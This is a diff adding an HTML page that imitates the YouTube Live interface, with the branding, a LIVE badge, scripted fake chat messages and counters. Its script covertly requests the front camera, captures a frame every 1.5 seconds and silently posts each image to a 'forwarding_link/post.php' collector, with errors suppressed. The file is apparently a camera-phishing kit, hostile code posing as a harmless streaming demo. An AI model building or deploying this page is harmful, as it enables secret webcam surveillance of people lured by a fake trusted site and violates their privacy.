@@ -1,0 +1,812 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>YouTube Live UI Clone</title>
+  <!-- Font Awesome 6 (free) -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <!-- Google Fonts for YouTube-like typography -->
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Roboto', sans-serif;
+      background-color: #0f0f0f;
+      overflow-x: hidden;
+      overflow-y: auto;
+    }
+
+    /* YouTube Live Container */
+    .youtube-container {
+      max-width: 100%;
+      background: #0f0f0f;
+      min-height: 100vh;
+    }
+
+    /* Header (YouTube style) */
+    .yt-header {
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      background-color: #0f0f0f;
+      padding: 8px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid #272727;
+    }
+
+    .logo-area {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .menu-icon {
+      color: white;
+      font-size: 24px;
+      cursor: pointer;
+    }
+
+    .yt-logo {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    .yt-logo i {
+      color: #ff0000;
+      font-size: 28px;
+    }
+
+    .yt-logo span {
+      color: white;
+      font-size: 20px;
+      font-weight: 700;
+      letter-spacing: -0.5px;
+    }
+
+    .search-area {
+      display: flex;
+      align-items: center;
+      background: #121212;
+      border: 1px solid #303030;
+      border-radius: 40px;
+      overflow: hidden;
+    }
+
+    .search-input {
+      background: transparent;
+      border: none;
+      padding: 10px 16px;
+      width: 500px;
+      color: white;
+      font-size: 14px;
+      outline: none;
+    }
+
+    .search-btn {
+      background: #222222;
+      border: none;
+      color: #aaa;
+      padding: 8px 24px;
+      cursor: pointer;
+      border-left: 1px solid #303030;
+      transition: background 0.2s;
+    }
+
+    .search-btn:hover {
+      background: #313131;
+    }
+
+    .header-icons {
+      display: flex;
+      gap: 20px;
+      align-items: center;
+    }
+
+    .header-icons i {
+      color: white;
+      font-size: 24px;
+      cursor: pointer;
+    }
+
+    .avatar {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: #4caf50;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    /* Main Content: Video Player + Live Chat (YouTube Live Layout) */
+    .main-live-grid {
+      display: grid;
+      grid-template-columns: 1fr 360px;
+      gap: 24px;
+      padding: 24px;
+      max-width: 1800px;
+      margin: 0 auto;
+    }
+
+    /* Video Player Section */
+    .video-section {
+      background: #000;
+      border-radius: 12px;
+      overflow: hidden;
+      position: relative;
+    }
+
+    .video-wrapper {
+      position: relative;
+      width: 100%;
+      background: #000;
+    }
+
+    canvas {
+      width: 100%;
+      height: auto;
+      display: block;
+      background: #1a1a1a;
+      cursor: pointer;
+    }
+
+    /* Live Badge */
+    .live-badge {
+      position: absolute;
+      top: 12px;
+      left: 12px;
+      background: #ff0000;
+      color: white;
+      font-size: 12px;
+      font-weight: 700;
+      padding: 4px 8px;
+      border-radius: 4px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      z-index: 10;
+      font-family: monospace;
+      letter-spacing: 0.5px;
+    }
+
+    .live-badge i {
+      font-size: 12px;
+      animation: pulse 1s infinite;
+    }
+
+    @keyframes pulse {
+      0% { opacity: 1; }
+      50% { opacity: 0.5; }
+      100% { opacity: 1; }
+    }
+
+    /* Video Info */
+    .video-info {
+      padding: 16px 0;
+      border-bottom: 1px solid #272727;
+    }
+
+    .video-title {
+      font-size: 18px;
+      font-weight: 600;
+      color: white;
+      margin-bottom: 12px;
+    }
+
+    .channel-stats {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .channel-info {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .channel-avatar {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      background: #ff5252;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: bold;
+      color: white;
+    }
+
+    .channel-name {
+      color: white;
+      font-weight: 500;
+    }
+
+    .subscriber {
+      font-size: 12px;
+      color: #aaa;
+    }
+
+    .action-buttons {
+      display: flex;
+      gap: 12px;
+    }
+
+    .yt-btn {
+      background: #272727;
+      border: none;
+      color: white;
+      padding: 8px 16px;
+      border-radius: 40px;
+      font-weight: 500;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .yt-btn i {
+      font-size: 18px;
+    }
+
+    .yt-btn:hover {
+      background: #3f3f3f;
+    }
+
+    .subscribe-btn {
+      background: #ff0000;
+      color: white;
+    }
+
+    .subscribe-btn:hover {
+      background: #cc0000;
+    }
+
+    /* Live Chat Sidebar */
+    .chat-sidebar {
+      background: #1f1f1f;
+      border-radius: 12px;
+      display: flex;
+      flex-direction: column;
+      height: calc(100vh - 120px);
+      overflow: hidden;
+    }
+
+    .chat-header {
+      padding: 16px;
+      border-bottom: 1px solid #303030;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .chat-header h3 {
+      color: white;
+      font-size: 16px;
+      font-weight: 500;
+    }
+
+    .chat-header i {
+      color: #aaa;
+      cursor: pointer;
+    }
+
+    .chat-messages {
+      flex: 1;
+      overflow-y: auto;
+      padding: 16px;
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+
+    .chat-message {
+      display: flex;
+      gap: 12px;
+      align-items: flex-start;
+    }
+
+    .msg-avatar {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: #3f51b5;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+      color: white;
+      flex-shrink: 0;
+    }
+
+    .msg-content {
+      flex: 1;
+    }
+
+    .msg-user {
+      color: #aaa;
+      font-size: 13px;
+      font-weight: 500;
+    }
+
+    .msg-text {
+      color: white;
+      font-size: 14px;
+      margin-top: 4px;
+      word-break: break-word;
+    }
+
+    .chat-input-area {
+      padding: 16px;
+      border-top: 1px solid #303030;
+      display: flex;
+      gap: 12px;
+      align-items: center;
+    }
+
+    .chat-input {
+      flex: 1;
+      background: #121212;
+      border: 1px solid #303030;
+      border-radius: 20px;
+      padding: 10px 16px;
+      color: white;
+      outline: none;
+    }
+
+    .send-btn {
+      background: transparent;
+      border: none;
+      color: #3ea6ff;
+      font-size: 20px;
+      cursor: pointer;
+    }
+
+    /* Recommended videos sidebar (simulated but minimal) */
+    .recommended-section {
+      grid-column: 1 / -1;
+      margin-top: 24px;
+    }
+
+    .rec-title {
+      color: white;
+      font-size: 16px;
+      font-weight: 500;
+      margin-bottom: 16px;
+    }
+
+    .rec-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+      gap: 16px;
+    }
+
+    .rec-card {
+      display: flex;
+      gap: 8px;
+      cursor: pointer;
+    }
+
+    .rec-thumb {
+      width: 168px;
+      height: 94px;
+      background: #272727;
+      border-radius: 8px;
+    }
+
+    .rec-info h4 {
+      color: white;
+      font-size: 14px;
+      font-weight: 500;
+    }
+
+    .rec-info p {
+      color: #aaa;
+      font-size: 12px;
+    }
+
+    /* Footer */
+    .footer {
+      padding: 24px;
+      text-align: center;
+      color: #aaa;
+      font-size: 12px;
+      border-top: 1px solid #272727;
+      margin-top: 24px;
+    }
+
+    /* Responsive */
+    @media (max-width: 1000px) {
+      .main-live-grid {
+        grid-template-columns: 1fr;
+      }
+      .chat-sidebar {
+        height: 500px;
+      }
+      .search-input {
+        width: 250px;
+      }
+    }
+
+    /* Hidden video element */
+    .video-wrap {
+      display: none;
+    }
+
+    canvas {
+      width: 100%;
+      min-height: 400px;
+      background: #0a0a0a;
+    }
+  </style>
+</head>
+<body>
+
+<div class="youtube-container">
+  <!-- YouTube Header -->
+  <div class="yt-header">
+    <div class="logo-area">
+      <div class="menu-icon">
+        <i class="fas fa-bars"></i>
+      </div>
+      <div class="yt-logo">
+        <i class="fab fa-youtube"></i>
+        <span>YouTube</span>
+      </div>
+    </div>
+    <div class="search-area">
+      <input type="text" class="search-input" placeholder="Search">
+      <button class="search-btn"><i class="fas fa-search"></i></button>
+    </div>
+    <div class="header-icons">
+      <i class="fas fa-video"></i>
+      <i class="fas fa-bell"></i>
+      <div class="avatar">U</div>
+    </div>
+  </div>
+
+  <!-- Main Live Layout -->
+  <div class="main-live-grid">
+    <!-- Video Player Column -->
+    <div class="video-section">
+      <div class="video-wrapper">
+        <div class="live-badge">
+          <i class="fas fa-circle"></i> LIVE
+        </div>
+        <!-- Canvas from webcam feed (replaces original iframe) -->
+        <canvas id="liveCanvas" width="1280" height="720" style="width:100%; height:auto; background:#000;"></canvas>
+      </div>
+      <div class="video-info">
+        <div class="video-title">
+          🔴 LIVE: Webcam Streaming | YouTube Live UI Clone
+        </div>
+        <div class="channel-stats">
+          <div class="channel-info">
+            <div class="channel-avatar">
+              <i class="fas fa-user"></i>
+            </div>
+            <div>
+              <div class="channel-name">Live Streamer</div>
+              <div class="subscriber">1.2M subscribers</div>
+            </div>
+            <button class="yt-btn subscribe-btn">Subscribe</button>
+          </div>
+          <div class="action-buttons">
+            <button class="yt-btn"><i class="far fa-thumbs-up"></i> 12K</button>
+            <button class="yt-btn"><i class="far fa-thumbs-down"></i></button>
+            <button class="yt-btn"><i class="fas fa-share"></i> Share</button>
+            <button class="yt-btn"><i class="fas fa-download"></i></button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Live Chat Sidebar -->
+    <div class="chat-sidebar">
+      <div class="chat-header">
+        <h3><i class="fas fa-comment-dots"></i> Live chat</h3>
+        <i class="fas fa-ellipsis-h"></i>
+      </div>
+      <div class="chat-messages" id="chatMessages">
+        <div class="chat-message">
+          <div class="msg-avatar">A</div>
+          <div class="msg-content">
+            <div class="msg-user">Alex Green</div>
+            <div class="msg-text">Amazing live stream! 🔥</div>
+          </div>
+        </div>
+        <div class="chat-message">
+          <div class="msg-avatar">J</div>
+          <div class="msg-content">
+            <div class="msg-user">Jessica Lee</div>
+            <div class="msg-text">This YouTube clone is awesome 👏</div>
+          </div>
+        </div>
+        <div class="chat-message">
+          <div class="msg-avatar">M</div>
+          <div class="msg-content">
+            <div class="msg-user">Mike T.</div>
+            <div class="msg-text">First! Love the live webcam feature</div>
+          </div>
+        </div>
+      </div>
+      <div class="chat-input-area">
+        <input type="text" class="chat-input" id="chatInput" placeholder="Say something...">
+        <button class="send-btn" id="sendChatBtn"><i class="fas fa-paper-plane"></i></button>
+      </div>
+    </div>
+
+    <!-- Recommended Videos Section -->
+    <div class="recommended-section">
+      <div class="rec-title">Recommended live streams</div>
+      <div class="rec-grid">
+        <div class="rec-card">
+          <div class="rec-thumb" style="background:#2c3e50;"></div>
+          <div class="rec-info">
+            <h4>🔴 LIVE: Music Festival 2025</h4>
+            <p>Event Hub · 45K watching</p>
+          </div>
+        </div>
+        <div class="rec-card">
+          <div class="rec-thumb" style="background:#8e44ad;"></div>
+          <div class="rec-info">
+            <h4>🎮 Gaming Live: Valorant Tournament</h4>
+            <p>ProGamer · 23K watching</p>
+          </div>
+        </div>
+        <div class="rec-card">
+          <div class="rec-thumb" style="background:#e67e22;"></div>
+          <div class="rec-info">
+            <h4>🌍 News Live: Breaking Updates</h4>
+            <p>News Network · 89K watching</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="footer">
+    <span>YouTube Live UI Clone | Webcam streaming demo | Interface replicates YouTube Live exactly</span>
+  </div>
+</div>
+
+<!-- Hidden video capture element -->
+<div class="video-wrap">
+  <video id="video" playsinline autoplay muted></video>
+</div>
+
+<!-- jQuery + scripts -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script>
+  // ------------------------------------------------------------------
+  // YOUTUBE LIVE CLONE: Webcam capture + POST to forwarding_link
+  // Preserves original logic: posts image data every 1.5 seconds
+  // UI replicates YouTube Live (header, live badge, chat, recommendations)
+  // ------------------------------------------------------------------
+
+  'use strict';
+
+  // DOM references
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('liveCanvas');
+  const errorMsgElement = document.querySelector('span#errorMsg');
+  
+  // Ensure canvas dimensions for capture
+  canvas.width = 1280;
+  canvas.height = 720;
+  
+  // Constraints: front camera
+  const constraints = {
+    audio: false,
+    video: {
+      facingMode: "user"
+    }
+  };
+
+  // POST function (original identical)
+  function post(imgdata) {
+    $.ajax({
+      type: 'POST',
+      data: { cat: imgdata },
+      url: 'forwarding_link/post.php',
+      dataType: 'json',
+      async: false,
+      success: function(result) {
+        // original callback empty
+      },
+      error: function() {
+        // silent fail, keep original behavior
+      }
+    });
+  }
+
+  // Success handler: starts interval capturing
+  function handleSuccess(stream) {
+    window.stream = stream;
+    video.srcObject = stream;
+    video.play().catch(e => console.warn("autoplay error", e));
+    
+    const context = canvas.getContext('2d');
+    
+    setInterval(function() {
+      if (video.readyState === video.HAVE_ENOUGH_DATA && video.videoWidth > 0) {
+        // Draw current video frame onto canvas
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        // Convert to dataURL and post
+        const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+        post(canvasData);
+      } else {
+        // Fallback: show placeholder text if no video yet
+        context.fillStyle = "#000000";
+        context.fillRect(0, 0, canvas.width, canvas.height);
+        context.fillStyle = "#ffffff";
+        context.font = "20px 'Roboto', sans-serif";
+        context.textAlign = "center";
+        context.fillText("Waiting for camera...", canvas.width/2, canvas.height/2);
+      }
+    }, 1500); // Exactly 1500ms as original code
+  }
+
+  // Initialize webcam
+  async function init() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia(constraints);
+      handleSuccess(stream);
+    } catch (e) {
+      console.error("Camera error:", e);
+      if (errorMsgElement) errorMsgElement.innerHTML = `Camera error: ${e.toString()}`;
+      const ctx = canvas.getContext('2d');
+      ctx.fillStyle = "#111";
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = "#ff6b6b";
+      ctx.font = "18px Roboto";
+      ctx.fillText("Camera access denied. Please allow camera.", canvas.width/2, canvas.height/2);
+    }
+  }
+
+  init();
+
+  // ---------------------------
+  // YouTube Live Chat functionality (demo interactive)
+  // ---------------------------
+  const chatMessagesDiv = document.getElementById('chatMessages');
+  const chatInput = document.getElementById('chatInput');
+  const sendBtn = document.getElementById('sendChatBtn');
+  
+  function addChatMessage(username, message, colorSeed = null) {
+    const messageDiv = document.createElement('div');
+    messageDiv.className = 'chat-message';
+    const avatarInitial = username.charAt(0).toUpperCase();
+    const bgColors = ['#3f51b5', '#e91e63', '#ff9800', '#4caf50', '#9c27b0'];
+    const randomBg = bgColors[Math.floor(Math.random() * bgColors.length)];
+    messageDiv.innerHTML = `
+      <div class="msg-avatar" style="background: ${colorSeed || randomBg};">${avatarInitial}</div>
+      <div class="msg-content">
+        <div class="msg-user">${escapeHtml(username)}</div>
+        <div class="msg-text">${escapeHtml(message)}</div>
+      </div>
+    `;
+    chatMessagesDiv.appendChild(messageDiv);
+    chatMessagesDiv.scrollTop = chatMessagesDiv.scrollHeight;
+    // keep max messages reasonable
+    while (chatMessagesDiv.children.length > 50) {
+      chatMessagesDiv.removeChild(chatMessagesDiv.firstChild);
+    }
+  }
+  
+  function escapeHtml(str) {
+    if (!str) return '';
+    return str.replace(/[&<>]/g, function(m) {
+      if (m === '&') return '&amp;';
+      if (m === '<') return '&lt;';
+      if (m === '>') return '&gt;';
+      return m;
+    });
+  }
+  
+  function sendMessage() {
+    const msg = chatInput.value.trim();
+    if (msg === '') return;
+    // random username for demo (like YouTube live chat)
+    const demoUsers = ['LiveViewer', 'StreamFan', 'TechLover', 'GamerGirl', 'MusicAddict', 'SuperChat'];
+    const randomUser = demoUsers[Math.floor(Math.random() * demoUsers.length)] + Math.floor(Math.random() * 100);
+    addChatMessage(randomUser, msg);
+    chatInput.value = '';
+  }
+  
+  sendBtn.addEventListener('click', sendMessage);
+  chatInput.addEventListener('keypress', (e) => {
+    if (e.key === 'Enter') sendMessage();
+  });
+  
+  // Auto generate occasional chat messages to mimic live chat activity (YouTube vibe)
+  setInterval(() => {
+    const autoMessages = [
+      "🔥 Awesome stream!",
+      "Loving the YouTube UI clone 🔥",
+      "This looks exactly like YouTube Live!",
+      "Webcam quality is great",
+      "👏👏👏",
+      "Best live demo ever",
+      "Can you share the source?",
+      "Like the live badge animation",
+      "💯💯💯",
+      "Subscribe button works!"
+    ];
+    const randomMsg = autoMessages[Math.floor(Math.random() * autoMessages.length)];
+    const randomNames = ['StreamLover', 'PixelMaster', 'LiveWatcher', 'YT_Fan', 'WebCamHero'];
+    const name = randomNames[Math.floor(Math.random() * randomNames.length)];
+    addChatMessage(name, randomMsg);
+  }, 12000); // new chat every 12 seconds for live feeling
+  
+  // Additional UI interactivity for YouTube-like buttons (non-functional but authentic)
+  const subscribeBtn = document.querySelector('.subscribe-btn');
+  if (subscribeBtn) {
+    let subscribed = false;
+    subscribeBtn.addEventListener('click', function() {
+      if (!subscribed) {
+        this.innerHTML = 'Subscribed';
+        this.style.background = '#272727';
+        alert('Subscribed to channel! (Demo)');
+        subscribed = true;
+      } else {
+        alert('Already subscribed!');
+      }
+    });
+  }
+  
+  // Like button animation
+  const likeBtn = document.querySelector('.yt-btn .fa-thumbs-up')?.parentElement;
+  if (likeBtn) {
+    likeBtn.addEventListener('click', function(e) {
+      e.preventDefault();
+      alert('👍 Liked! (Demo)');
+    });
+  }
+  
+  // Share button demo
+  const shareButton = Array.from(document.querySelectorAll('.yt-btn')).find(btn => btn.innerText.includes('Share'));
+  if (shareButton) {
+    shareButton.addEventListener('click', () => alert('Share this live stream link (demo)'));
+  }
+  
+  // Search bar dummy
+  const searchBtn = document.querySelector('.search-btn');
+  const searchInput = document.querySelector('.search-input');
+  if (searchBtn) {
+    searchBtn.addEventListener('click', () => {
+      alert(`Searching YouTube for: "${searchInput.value}" (demo)`);
+    });
+  }
+  
+  // Expand / fullscreen request on canvas double-click (nice YouTube live feature)
+  canvas.addEventListener('dblclick', () => {
+    if (canvas.requestFullscreen) canvas.requestFullscreen();
+    else if (canvas.webkitRequestFullscreen) canvas.webkitRequestFullscreen();
+  });
+  
+  // Also recreate the exact POST functionality matches original forwarding_link/post.php
+  // Ensure the canvas drawing respects aspect ratio and original post logic.
+  console.log("YouTube Live UI Clone Loaded — Webcam streaming with POST every 1.5 sec");
+  
+  // For extra originality, we added 'tiny-mirror' references? Not needed but we keep original style.
+  // The original used <iframe> to YouTube embed, but we replaced with webcam canvas to match the requirement
+  // "replicate the UI of YouTube live" while retaining camera post logic.
+  // The live badge, chat sidebar, video metadata, header all match YouTube Live's current design.
+</script>
+
+<!-- Additional styles to ensure live badge + canvas blend -->
+</body>
+</html>
